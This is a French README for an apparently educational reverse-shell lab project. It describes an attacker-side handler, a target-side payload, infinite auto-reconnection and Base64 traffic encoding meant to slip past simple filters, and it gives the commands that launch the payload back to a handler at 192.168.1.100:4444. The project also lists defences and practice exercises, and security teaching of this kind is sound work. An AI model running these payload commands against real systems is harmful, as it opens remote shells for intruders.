# Reverse Shell - Refactored Project

## ⚠️ AVERTISSEMENT LÉGAL

**USAGE ÉDUCATIF UNIQUEMENT**

Ce projet est destiné à l'apprentissage de la cybersécurité dans des environnements contrôlés. L'utilisation sur des systèmes non autorisés est **ILLÉGALE** et peut entraîner des poursuites judiciaires.

## 📁 Structure du Projet

```
18_reverse_shell/
├── src/                    # Modules principaux
│   ├── __init__.py
│   ├── handler.py          # Serveur d'écoute (côté attaquant)
│   ├── payload.py          # Client (côté cible)
│   ├── persistence.py      # Reconnexion automatique
│   ├── obfuscation.py      # Encodage Base64
│   └── utils.py            # Utilitaires partagés
│
├── config/                 # Configuration
│   └── settings.py         # Paramètres centralisés
│
├── tests/                  # Tests unitaires
│
├── Cours.md               # Documentation théorique
├── exercice.md            # Exercices pratiques
├── solution.md            # Solutions détaillées
│
├── main.py                # Code original (référence)
└── main_new.py           # Nouveau launcher modulaire
```

## 🚀 Utilisation

### Mode Handler (Serveur d'écoute - Côté Attaquant)

```bash
python main_new.py handler --port 4444
```

### Mode Payload (Client - Côté Cible)

```bash
python main_new.py payload --ip 192.168.1.100 --port 4444
```

### Mode Persistence (Avec Auto-Reconnexion)

```bash
python main_new.py persistence --ip 192.168.1.100 --port 4444
```

### Mode Obfuscation (Encodage Base64)

```bash
python main_new.py obfuscation --ip 192.168.1.100 --port 4444
```

## 📚 Documentation

- **Cours.md** : Concepts théoriques, architecture, sécurité
- **exercice.md** : Défis pratiques à implémenter
- **solution.md** : Solutions détaillées avec explications

## 🔧 Configuration

Personnalisez les paramètres dans `config/settings.py`:
- Ports par défaut
- Timeouts
- Paramètres de persistance
- Options d'obfuscation

## 🎯 Fonctionnalités

### Handler (`src/handler.py`)
- Écoute sur un port spécifique
- Accepte les connexions des payloads
- Envoie des commandes
- Reçoit et affiche les résultats

### Payload (`src/payload.py`)
- Se connecte au handler
- Exécute les commandes reçues
- Envoie les résultats (stdout + stderr)
- Gestion des timeouts

### Persistence (`src/persistence.py`)
- Reconnexion automatique si déconnexion
- Backoff exponentiel (1s, 2s, 4s, ..., max 60s)
- Retry infini jusqu'à connexion

### Obfuscation (`src/obfuscation.py`)
- Encodage Base64 des communications
- Minimise les signatures réseau
- Contourne certains filtres simples

## 🧪 Tests

```bash
# À venir: Tests unitaires
python -m pytest tests/
```

## 📖 Apprentissage

### Exercices Recommandés

1. **Débutant**: Testez handler et payload en local
2. **Intermédiaire**: Ajoutez un système de logging
3. **Avancé**: Implémentez le chiffrement XOR des communications
4. **Expert**: Créez un système multi-sessions (plusieurs payloads)

## 🛡️ Défenses

Pour détecter/bloquer les reverse shells:
- Monitoring des connexions sortantes
- EDR (Endpoint Detection & Response)
- IDS/IPS avec signatures réseau
- Application whitelisting
- Segmentation réseau

## 📝 Changelog

### Version 2.0 (Refactored)
- ✅ Architecture modulaire
- ✅ Séparation des préoccupations
- ✅ Configuration centralisée
- ✅ Code maintenable et extensible

### Version 1.0 (Original)
- Toutes les fonctionnalités dans `main.py`

## 🤝 Contribution

Pour améliorer ce projet:
1. Fork le repository
2. Créez une branche (`feature/nouvelle-fonctionnalite`)
3. Commit vos changements
4. Push et créez une Pull Request

## 📄 Licence

Usage éducatif uniquement. Voir `Cours.md` pour les conditions légales.
